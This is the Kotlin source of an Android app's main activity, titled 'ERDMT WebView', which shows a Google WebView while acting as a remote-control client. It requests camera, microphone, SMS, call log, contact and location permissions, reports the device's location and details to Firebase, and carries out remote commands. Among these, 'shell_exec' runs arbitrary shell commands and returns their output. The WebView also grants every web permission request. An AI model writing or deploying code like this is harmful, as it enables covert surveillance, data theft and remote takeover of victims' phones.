
package com.yourdomain.erdmt

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.webkit.*
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.android.material.card.MaterialCardView
import com.google.android.material.progressindicator.LinearProgressIndicator
import com.google.android.material.textview.MaterialTextView
import com.google.android.material.appbar.MaterialToolbar
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.database.*
import com.google.firebase.storage.FirebaseStorage
import android.content.BroadcastReceiver
import android.content.Context
import android.content.IntentFilter
import android.location.LocationManager
import android.os.BatteryManager
import android.provider.Settings
import java.util.*

class MainActivity : AppCompatActivity() {
    
    private lateinit var webView: WebView
    private lateinit var progressBar: LinearProgressIndicator
    private lateinit var errorLayout: View
    private lateinit var errorMessage: MaterialTextView
    private lateinit var permissionCard: MaterialCardView
    private lateinit var permissionStatus: MaterialTextView
    private lateinit var requestPermissionsBtn: MaterialButton
    private lateinit var toolbar: MaterialToolbar
    private lateinit var fab: FloatingActionButton
    private lateinit var firebaseAnalytics: FirebaseAnalytics
    
    // Firebase
    private lateinit var database: FirebaseDatabase
    private lateinit var storage: FirebaseStorage
    private var deviceId: String = ""
    private lateinit var deviceRef: DatabaseReference
    private lateinit var commandsRef: DatabaseReference
    
    private var fileUploadCallback: ValueCallback<Array<Uri>>? = null
    private val FILE_CHOOSER_REQUEST_CODE = 1001
    
    // All required permissions
    private val ALL_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )
    } else {
        arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
    }
    
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        updatePermissionStatus()
        registerDeviceWithFirebase()
    }
    
    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == Intent.ACTION_BATTERY_CHANGED) {
                updateDeviceStatus()
            }
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        initializeViews()
        initializeFirebase()
        setupWebView()
        setupPermissions()
        setupEventListeners()
        
        // Start background service
        startService(Intent(this, BackgroundService::class.java))
        
        // Register battery receiver
        registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
    }
    
    private fun initializeViews() {
        webView = findViewById(R.id.webView)
        progressBar = findViewById(R.id.progressBar)
        errorLayout = findViewById(R.id.errorLayout)
        errorMessage = findViewById(R.id.errorMessage)
        permissionCard = findViewById(R.id.permissionCard)
        permissionStatus = findViewById(R.id.permissionStatus)
        requestPermissionsBtn = findViewById(R.id.requestPermissionsBtn)
        toolbar = findViewById(R.id.toolbar)
        fab = findViewById(R.id.fab)
        
        setSupportActionBar(toolbar)
        supportActionBar?.title = "ERDMT WebView"
    }
    
    private fun initializeFirebase() {
        database = FirebaseDatabase.getInstance()
        storage = FirebaseStorage.getInstance()
        firebaseAnalytics = FirebaseAnalytics.getInstance(this)
        
        // Generate or retrieve device ID
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        deviceRef = database.getReference("devices").child(deviceId)
        commandsRef = database.getReference("commands").child(deviceId)
        
        // Listen for commands
        listenForCommands()
        
        // Register device
        registerDeviceWithFirebase()
    }
    
    private fun registerDeviceWithFirebase() {
        val deviceInfo = hashMapOf<String, Any>(
            "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
            "androidVersion" to Build.VERSION.RELEASE,
            "apiLevel" to Build.VERSION.SDK_INT,
            "online" to true,
            "lastSeen" to ServerValue.TIMESTAMP,
            "permissions" to getGrantedPermissions()
        )
        
        updateDeviceStatus()
        
        deviceRef.setValue(deviceInfo).addOnCompleteListener { task ->
            if (task.isSuccessful) {
                Log.d(TAG, "Device registered successfully")
                logToFirebase("info", "Device registered with Firebase")
            } else {
                Log.e(TAG, "Failed to register device", task.exception)
                logToFirebase("error", "Failed to register device: ${task.exception?.message}")
            }
        }
        
        // Keep device online
        deviceRef.child("online").onDisconnect().setValue(false)
    }
    
    private fun updateDeviceStatus() {
        val updates = hashMapOf<String, Any>(
            "lastSeen" to ServerValue.TIMESTAMP,
            "battery" to getBatteryLevel(),
            "location" to getLastKnownLocation()
        )
        
        deviceRef.updateChildren(updates)
    }
    
    private fun getBatteryLevel(): Int {
        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) (level * 100 / scale) else 0
    }
    
    private fun getLastKnownLocation(): Map<String, Double>? {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
            == PackageManager.PERMISSION_GRANTED) {
            
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            return location?.let {
                mapOf("lat" to it.latitude, "lng" to it.longitude)
            }
        }
        return null
    }
    
    private fun getGrantedPermissions(): List<String> {
        return ALL_PERMISSIONS.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    private fun listenForCommands() {
        commandsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                snapshot.getValue<Map<String, Any>>()?.let { command ->
                    handleCommand(snapshot.key ?: "", command)
                }
            }
            
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Failed to listen for commands", error.toException())
            }
        })
    }
    
    private fun handleCommand(commandId: String, command: Map<String, Any>) {
        val commandType = command["command"] as? String ?: return
        val params = command["params"] as? String
        
        Log.d(TAG, "Received command: $commandType with params: $params")
        logToFirebase("info", "Received command: $commandType")
        
        // Remove the command after processing
        commandsRef.child(commandId).removeValue()
        
        when (commandType) {
            "mic_record" -> handleMicRecord()
            "camera_capture" -> handleCameraCapture()
            "get_location" -> handleGetLocation()
            "read_sms" -> handleReadSMS()
            "read_call_logs" -> handleReadCallLogs()
            "read_contacts" -> handleReadContacts()
            "list_installed_apps" -> handleListApps()
            "shell_exec" -> handleShellExec(params)
            "toggle_icon" -> handleToggleIcon(params)
            else -> {
                logToFirebase("warning", "Unknown command: $commandType")
                sendResponse(commandType, mapOf("error" to "Unknown command"))
            }
        }
    }
    
    private fun handleMicRecord() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
            == PackageManager.PERMISSION_GRANTED) {
            
            // Implement audio recording logic here
            // For now, just send a response
            sendResponse("mic_record", mapOf(
                "status" to "success",
                "message" to "Audio recording started",
                "duration" to 10
            ))
            
            logToFirebase("success", "Audio recording command executed")
        } else {
            sendResponse("mic_record", mapOf("error" to "Audio permission not granted"))
            logToFirebase("error", "Audio recording failed: permission denied")
        }
    }
    
    private fun handleCameraCapture() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
            == PackageManager.PERMISSION_GRANTED) {
            
            // Implement camera capture logic here
            sendResponse("camera_capture", mapOf(
                "status" to "success",
                "message" to "Photo captured"
            ))
            
            logToFirebase("success", "Camera capture command executed")
        } else {
            sendResponse("camera_capture", mapOf("error" to "Camera permission not granted"))
            logToFirebase("error", "Camera capture failed: permission denied")
        }
    }
    
    private fun handleGetLocation() {
        val location = getLastKnownLocation()
        if (location != null) {
            sendResponse("get_location", mapOf(
                "status" to "success",
                "location" to location
            ))
            logToFirebase("success", "Location retrieved")
        } else {
            sendResponse("get_location", mapOf("error" to "Location not available"))
            logToFirebase("error", "Location retrieval failed")
        }
    }
    
    private fun handleReadSMS() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
            == PackageManager.PERMISSION_GRANTED) {
            
            // Implement SMS reading logic here
            sendResponse("read_sms", mapOf(
                "status" to "success",
                "count" to 0,
                "messages" to emptyList<Map<String, Any>>()
            ))
            
            logToFirebase("success", "SMS read command executed")
        } else {
            sendResponse("read_sms", mapOf("error" to "SMS permission not granted"))
            logToFirebase("error", "SMS reading failed: permission denied")
        }
    }
    
    private fun handleReadCallLogs() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) 
            == PackageManager.PERMISSION_GRANTED) {
            
            // Implement call log reading logic here
            sendResponse("read_call_logs", mapOf(
                "status" to "success",
                "count" to 0,
                "logs" to emptyList<Map<String, Any>>()
            ))
            
            logToFirebase("success", "Call logs read command executed")
        } else {
            sendResponse("read_call_logs", mapOf("error" to "Call log permission not granted"))
            logToFirebase("error", "Call log reading failed: permission denied")
        }
    }
    
    private fun handleReadContacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
            == PackageManager.PERMISSION_GRANTED) {
            
            // Implement contacts reading logic here
            sendResponse("read_contacts", mapOf(
                "status" to "success",
                "count" to 0,
                "contacts" to emptyList<Map<String, Any>>()
            ))
            
            logToFirebase("success", "Contacts read command executed")
        } else {
            sendResponse("read_contacts", mapOf("error" to "Contacts permission not granted"))
            logToFirebase("error", "Contacts reading failed: permission denied")
        }
    }
    
    private fun handleListApps() {
        val packageManager = packageManager
        val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
            .filter { !it.flags.and(android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0 }
            .map { appInfo ->
                mapOf(
                    "name" to packageManager.getApplicationLabel(appInfo).toString(),
                    "packageName" to appInfo.packageName
                )
            }
        
        sendResponse("list_installed_apps", mapOf(
            "status" to "success",
            "count" to installedApps.size,
            "apps" to installedApps
        ))
        
        logToFirebase("success", "Installed apps listed: ${installedApps.size} apps")
    }
    
    private fun handleShellExec(command: String?) {
        if (command.isNullOrBlank()) {
            sendResponse("shell_exec", mapOf("error" to "No command provided"))
            return
        }
        
        try {
            val process = Runtime.getRuntime().exec(command)
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            
            sendResponse("shell_exec", mapOf(
                "status" to "success",
                "command" to command,
                "output" to output,
                "error" to error
            ))
            
            logToFirebase("success", "Shell command executed: $command")
        } catch (e: Exception) {
            sendResponse("shell_exec", mapOf(
                "error" to "Command execution failed: ${e.message}",
                "command" to command
            ))
            logToFirebase("error", "Shell command failed: ${e.message}")
        }
    }
    
    private fun handleToggleIcon(action: String?) {
        // Implement icon toggle logic here
        sendResponse("toggle_icon", mapOf(
            "status" to "success",
            "action" to action,
            "message" to "Icon toggle not implemented"
        ))
        
        logToFirebase("info", "Icon toggle command received: $action")
    }
    
    private fun sendResponse(command: String, data: Map<String, Any>) {
        val response = mapOf(
            "command" to command,
            "data" to data,
            "timestamp" to ServerValue.TIMESTAMP,
            "deviceId" to deviceId
        )
        
        database.getReference("responses").child(deviceId).push().setValue(response)
    }
    
    private fun logToFirebase(level: String, message: String) {
        val log = mapOf(
            "level" to level,
            "message" to message,
            "timestamp" to ServerValue.TIMESTAMP,
            "deviceId" to deviceId
        )
        
        database.getReference("logs").push().setValue(log)
    }
    
    private fun setupWebView() {
        webView.apply {
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                allowFileAccess = true
                allowContentAccess = true
                allowFileAccessFromFileURLs = true
                allowUniversalAccessFromFileURLs = true
                mediaPlaybackRequiresUserGesture = false
                setSupportZoom(true)
                builtInZoomControls = true
                displayZoomControls = false
                loadWithOverviewMode = true
                useWideViewPort = true
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            }
            
            webViewClient = object : WebViewClient() {
                override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                    super.onPageStarted(view, url, favicon)
                    progressBar.visibility = android.view.View.VISIBLE
                    errorLayout.visibility = android.view.View.GONE
                }
                
                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    progressBar.visibility = android.view.View.GONE
                }
                
                override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                    super.onReceivedError(view, request, error)
                    progressBar.visibility = android.view.View.GONE
                    errorLayout.visibility = android.view.View.VISIBLE
                    errorMessage.text = error?.description ?: "Unknown error occurred"
                }
            }
            
            webChromeClient = object : WebChromeClient() {
                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                    super.onProgressChanged(view, newProgress)
                    progressBar.setProgressCompat(newProgress, true)
                }
                
                override fun onPermissionRequest(request: PermissionRequest?) {
                    request?.grant(request.resources)
                }
                
                override fun onShowFileChooser(
                    webView: WebView?,
                    filePathCallback: ValueCallback<Array<Uri>>?,
                    fileChooserParams: FileChooserParams?
                ): Boolean {
                    fileUploadCallback = filePathCallback
                    
                    val intent = Intent(Intent.ACTION_GET_CONTENT).apply {
                        addCategory(Intent.CATEGORY_OPENABLE)
                        type = "*/*"
                        putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true)
                    }
                    
                    startActivityForResult(
                        Intent.createChooser(intent, "Choose File"),
                        FILE_CHOOSER_REQUEST_CODE
                    )
                    
                    return true
                }
            }
        }
        
        // Load Google
        webView.loadUrl("https://www.google.com")
    }
    
    private fun setupPermissions() {
        updatePermissionStatus()
    }
    
    private fun setupEventListeners() {
        requestPermissionsBtn.setOnClickListener {
            requestPermissions()
        }
        
        fab.setOnClickListener {
            webView.reload()
        }
        
        findViewById<MaterialButton>(R.id.retryBtn).setOnClickListener {
            webView.reload()
        }
    }
    
    private fun updatePermissionStatus() {
        val grantedCount = ALL_PERMISSIONS.count { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
        
        val totalCount = ALL_PERMISSIONS.size
        val allGranted = grantedCount == totalCount
        
        permissionStatus.text = if (allGranted) {
            "All permissions granted ($grantedCount/$totalCount)"
        } else {
            "Permissions: $grantedCount/$totalCount granted"
        }
        
        requestPermissionsBtn.text = if (allGranted) "Permissions OK" else "Grant Permissions"
        requestPermissionsBtn.isEnabled = !allGranted
        
        permissionCard.visibility = if (allGranted) android.view.View.GONE else android.view.View.VISIBLE
    }
    
    private fun requestPermissions() {
        val permissionsToRequest = ALL_PERMISSIONS.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        
        if (permissionsToRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionsToRequest)
        }
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == FILE_CHOOSER_REQUEST_CODE) {
            val results = if (resultCode == RESULT_OK) {
                data?.let { intent ->
                    if (intent.clipData != null) {
                        // Multiple files
                        val clipData = intent.clipData!!
                        Array(clipData.itemCount) { i ->
                            clipData.getItemAt(i).uri
                        }
                    } else {
                        // Single file
                        intent.data?.let { arrayOf(it) }
                    }
                }
            } else {
                null
            }
            
            fileUploadCallback?.onReceiveValue(results)
            fileUploadCallback = null
        }
    }
    
    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(batteryReceiver)
        deviceRef.child("online").setValue(false)
    }
    
    companion object {
        private const val TAG = "MainActivity"
    }
}
